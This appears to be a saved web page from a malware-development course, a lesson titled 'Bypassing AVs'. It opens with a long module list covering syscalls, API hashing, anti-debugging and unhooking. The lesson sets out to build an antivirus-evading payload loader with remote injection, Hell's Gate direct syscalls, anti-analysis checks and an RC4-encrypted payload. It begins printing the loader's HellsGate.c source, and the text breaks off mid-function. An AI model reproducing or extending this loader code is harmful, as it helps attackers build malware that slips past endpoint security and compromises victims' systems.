                        Module 53 - IAT Hiding &amp; Obfuscation - Custom GetProcAddress
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./54.html">
                    <div for="module-54" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 54 - IAT Hiding &amp; Obfuscation - Custom GetModuleHandle
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./55.html">
                    <div for="module-55" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 55 - IAT Hiding &amp; Obfuscation - API Hashing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./56.html">
                    <div for="module-56" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 56 - IAT Hiding &amp; Obfuscation - Custom Pseudo Handles
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./57.html">
                    <div for="module-57" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 57 - IAT Hiding &amp; Obfuscation - Compile Time API Hashing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./58.html">
                    <div for="module-58" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 58 - API Hooking - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./59.html">
                    <div for="module-59" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 59 - API Hooking - Detours Library
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./60.html">
                    <div for="module-60" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 60 - API Hooking - Minhook Library
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./61.html">
                    <div for="module-61" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 61 - API Hooking - Custom Code
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./62.html">
                    <div for="module-62" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 62 - API Hooking - Using Windows APIs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./63.html">
                    <div for="module-63" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 63 - Syscalls - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./64.html">
                    <div for="module-64" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 64 - Syscalls - Userland Hooking
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./65.html">
                    <div for="module-65" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 65 - Syscalls - SysWhispers
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./66.html">
                    <div for="module-66" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 66 - Syscalls - Hell's Gate
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./67.html">
                    <div for="module-67" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 67 - Syscalls - Reimplementing Classic Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./68.html">
                    <div for="module-68" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 68 - Syscalls - Reimplementing Mapping Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./69.html">
                    <div for="module-69" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 69 - Syscalls - Reimplementing APC Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./70.html">
                    <div for="module-70" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 70 - Anti-Analysis - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./71.html">
                    <div for="module-71" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 71 - Anti-Debugging - Multiple Techniques
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./72.html">
                    <div for="module-72" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 72 - Anti-Debugging - Self-Deletion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./73.html">
                    <div for="module-73" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 73 - Anti-Virtual Environments - Multiple Techniques
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./74.html">
                    <div for="module-74" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 74 - Anti-Virtual Environments - Multiple Delay Execution Techniques
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./75.html">
                    <div for="module-75" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 75 - Anti-Virtual Environments - API Hammering
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./76.html">
                    <div for="module-76" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 76 - Binary Entropy Reduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./77.html">
                    <div for="module-77" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 77 - Brute Force Decryption
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./78.html">
                    <div for="module-78" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 78 - MalDev Academy Tool - KeyGuard
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./79.html">
                    <div for="module-79" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 79 - CRT Library Removal &amp; Malware Compiling
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./80.html">
                    <div for="module-80" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 80 - IAT Camouflage
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./81.html">
                    <div for="module-81" class="ml-2 text-sm font-medium 
                                bg-blue-700 font-bold rounded-sm">
                        Module 81 - Bypassing AVs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./82.html">
                    <div for="module-82" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 82 - Introduction To EDRs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-83" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./83.html">
                    <div for="module-83" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 83 - NTDLL Unhooking - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-84" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./84.html">
                    <div for="module-84" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 84 - NTDLL Unhooking - From Disk
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-85" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./85.html">
                    <div for="module-85" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 85 - NTDLL Unhooking - From KnownDlls Directory
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-86" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./86.html">
                    <div for="module-86" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 86 - NTDLL Unhooking - From a Suspended Process
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-87" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./87.html">
                    <div for="module-87" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 87 - NTDLL Unhooking - From a Web Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-88" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./88.html">
                    <div for="module-88" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 88 - Updating Hell's Gate
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-89" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./89.html">
                    <div for="module-89" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 89 - Indirect Syscalls - HellsHall
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-90" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./90.html">
                    <div for="module-90" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 90 - Block DLL Policy
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-91" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./91.html">
                    <div for="module-91" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 91 - Diving Into NtCreateUserProcess
                    </div>
                </a>
            </div>
                </div>
    </div>
</div>          </div>
      </div>

      
      <div class="flex">
  <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-r border-l border-gray-600/60 pl-4 pt-2 pb-2 rounded-bl-xl rounded-br-xl shadow-inner">

          <div class="mr-2">
        <a data-target="_self" href="./80.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Previous</button>
        </a>
      </div>
    
    <div class="mr-2">
      <a data-target="_self" href="../All Modules.html">
        <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Modules</button>
      </a>
    </div>

    <div class="my-2 mr-2">
      <form id="complete-module" action="./81/complete" method="POST">
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-emerald-600/85 to-emerald-700/85
             hover:from-emerald-500/85 hover:to-emerald-600/85
             border border-emerald-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30 ">Complete</button>
      </form>
      <form id="uncomplete-module" action="./81#" method="POST">
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-rose-600/85 to-rose-700/85
             hover:from-rose-500/85 hover:to-rose-600/85
             border border-rose-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30 hidden">Undo</button>
      </form>
    </div>

          <div class="mr-2">
        <a data-target="_self" href="./82.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Next</button>
        </a>
      </div>
    
  </div>
</div>

      
      <input type="hidden" id="objectives-completed" value="20973">

      
      <div id="copyWarning" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm">
  <div class="relative bg-gray-800 border border-gray-600 rounded-2xl shadow-2xl p-8 max-w-lg w-11/12 text-center transform transition-all scale-100">
    <p class="text-2xl font-bold text-white mb-4 tracking-wide">
      Reminder
    </p>
    <p class="text-gray-300 text-base mb-6 leading-relaxed">
      To remain compliant with the Terms of Service, avoid copying the entire module and instead copy the necessary sections.
    </p>
    <button onclick="hideCopyWarning()" class="w-full text-white font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-all duration-200 bg-blue-600/80 hover:bg-blue-500/80 border border-blue-400/40 backdrop-blur-sm backdrop-saturate-150">
      I understand
    </button>
    <span class="absolute top-3 right-3 text-gray-400 hover:text-gray-200 cursor-pointer text-xl" onclick="hideCopyWarning()"></span>
  </div>
</div>



      
        </div>

  <footer id="footer" class="text-gray-400
    bg-gradient-to-t from-[#101926] via-[#172130] to-[#1e293b] backdrop-blur-md backdrop-saturate-150 z-20 border-t border-gray-700/50 border-gray-800
     hidden body-font">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://x.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white"></path>
          </svg>            
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
          Terms of Service
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
  </a></footer></template>

<div id="app-root">
  
  <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer z-20" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
      <img src="81_files/module-up.svg" width="20px" alt="">
  </div>

  <div class="bg-[#101926] p-4">
      
      <div class="flex relative z-10">
    <input type="hidden" value="20973">
    <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-l border-t border-gray-600/60 pl-4 pt-2 pb-2 rounded-tl-xl">
        <div>
            Module 81 - Bypassing AVs
        </div>
        <div class="ml-2 w-4 h-4 rounded-full shadow-inner bg-amber-400/90 ring-1 ring-amber-300/50"></div>

    </div>
    <div class="flex justify-end items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 pr-4 pt-2 pb-2 rounded-tr-xl border-t border-r border-gray-600/60">
        <div class="progress-container pr-4">
        <img src="81_files#.svg" onclick="toggleProgress()" id="progressToggle" width="20" alt="Progress Toggle" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="enlarge-container pr-4">
        <img src="81_files/enlarge.svg" onclick="toggleScreenWidth()" id="enlargeToggle" width="20" alt="Screen Width" class="hover:bg-gray-600 rounded-sm cursor-pointer">
        </div>

        <div class="objectives-container pr-4">
        <img src="81_files/objectives.svg" onclick="toggleObjectives()" id="objectivesToggle" width="20" alt="Objectives" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="toc-container pr-4">
        <img src="81_files/toc.svg" onclick="toggleToC()" id="tocToggle" width="20" alt="ToC" class="hover:bg-gray-600 rounded-sm cursor-pointer bg-gray-600">
        </div>

        <div class="terminal-container  pr-4 ">
        <img src="81_files/ide.svg" onclick="toggleIde()" id="terminalToggle" width="22" alt="Terminal" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>
                                    <div class="dl-container relative inline-block text-left flex">
                <button id="dl-btn" class="focus:outline-none items-center" aria-haspopup="true" aria-expanded="false">
                    <img src="81_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20" alt="Download">
                </button>

                <div id="dl-dropdown" class="hidden absolute right-0 mt-8 w-32 border-[2px] border-gray-500 rounded-md shadow-lg z-50" role="menu" aria-orientation="vertical" aria-labelledby="dl-btn">
                    
                    <a href="https://maldevacademy.com/download/file/Bypassing-AVs?lang=c" class="block px-4 bg-gray-700 py-2 text-sm hover:bg-gray-800 rounded-t-sm" role="menuitem" target="_blank">C Code</a>
                    <a href="https://maldevacademy.com/download/file/Bypassing-AVs?lang=rust" class="block px-4 py-2 bg-gray-700 text-sm hover:bg-gray-800 rounded-b-sm" role="menuitem" target="_blank">Rust Code</a>
                </div>
                </div>
                            </div>
</div>
      <div id="height-container" class="flex h-full min-h-[800px]">
          <div class="flex max-w-full min-w-full">
              <div class="flex-1 min-w-0">
                  
                  <div id="description-container" class="viewer code-description h-full w-full bg-gray-800/70 backdrop-blur-md backdrop-saturate-150 p-4 px-5 md:px-10 lg:px-20 border border-t-0 border-gray-600/60 shadow-inner"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">

    
    


    
    

    
    <div id="module-content" class="transition-opacity duration-300 opacity-100">
        <h2 id="toc-heading-0">Bypassing AVs</h2>
<h3 id="toc-heading-1">Introduction</h3>
<p>So far, numerous methods and techniques to create and execute a 
payload loader that can bypass a variety of software security programs 
have been demonstrated. This module will work to construct a 
feature-rich payload loader from the ground up to reinforce what has 
been taught in the previous modules.</p>
<p>Create an empty Visual Studio project and follow along to keep up with this module.</p>
<h3 id="toc-heading-2">Payload Loader Features</h3>
<p>The implemented payload loader will have the following features:</p>
<ul>
<li>Remote code injection support</li>
<li>Mapping injection using direct syscalls via Hell's Gate</li>
<li>API Hashing</li>
<li>Anti-Analysis functionality</li>
<li>RC4 payload encryption</li>
<li>Brute forcing the decryption key</li>
<li>No CRT library imports</li>
</ul>
<h3 id="toc-heading-3">Hell's Gate Setup</h3>
<p>This loader utilizes payload injection via direct syscalls obtained using Hell's Gate. To begin, one must create <code>Structs.h</code>, <code>HellsGate.c</code> and <code>HellAsm.asm</code> files. These files include the necessary functions to execute direct syscalls. The <code>Structs.h</code>
 file is used to save Windows undocumented structures and is included in
 subsequent C files. It contains structure definitions such as <code>PEB</code>, <code>TEB</code>, and more, which are necessary for implementing Hell's Gate.</p>
<p>The <code>HellAsm.asm</code> file will be the same as the one from the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/hellsgate.asm" target="_blank">repository</a>. As for <code>HellsGate.c</code>, it will have the following functions.</p>
<p><strong>HellsGate.c</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"Structs.h"</span></span>


PTEB <span class="token function">RtlGetThreadEnvironmentBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">_WIN64</span></span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span>PTEB<span class="token punctuation">)</span><span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span>PTEB<span class="token punctuation">)</span><span class="token function">__readfsdword</span><span class="token punctuation">(</span><span class="token number">0x16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token punctuation">}</span>


BOOL <span class="token function">GetImageExportDirectory</span><span class="token punctuation">(</span>PVOID pModuleBase<span class="token punctuation">,</span> PIMAGE_EXPORT_DIRECTORY<span class="token operator">*</span> ppImageExportDirectory<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token comment">// Get DOS header</span>
	PIMAGE_DOS_HEADER pImageDosHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>pModuleBase<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pImageDosHeader<span class="token operator">-&gt;</span>e_magic <span class="token operator">!=</span> IMAGE_DOS_SIGNATURE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Get NT headers</span>
	PIMAGE_NT_HEADERS pImageNtHeaders <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pModuleBase <span class="token operator">+</span> pImageDosHeader<span class="token operator">-&gt;</span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pImageNtHeaders<span class="token operator">-&gt;</span>Signature <span class="token operator">!=</span> IMAGE_NT_SIGNATURE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Get the EAT</span>
	<span class="token operator">*</span>ppImageExportDirectory <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pModuleBase <span class="token operator">+</span> pImageNtHeaders<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

BOOL <span class="token function">GetVxTableEntry</span><span class="token punctuation">(</span>PVOID pModuleBase<span class="token punctuation">,</span> PIMAGE_EXPORT_DIRECTORY pImageExportDirectory<span class="token punctuation">,</span> PVX_TABLE_ENTRY pVxTableEntry<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	PDWORD pdwAddressOfFunctions   <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pModuleBase <span class="token operator">+</span> pImageExportDirectory<span class="token operator">-&gt;</span>AddressOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span>
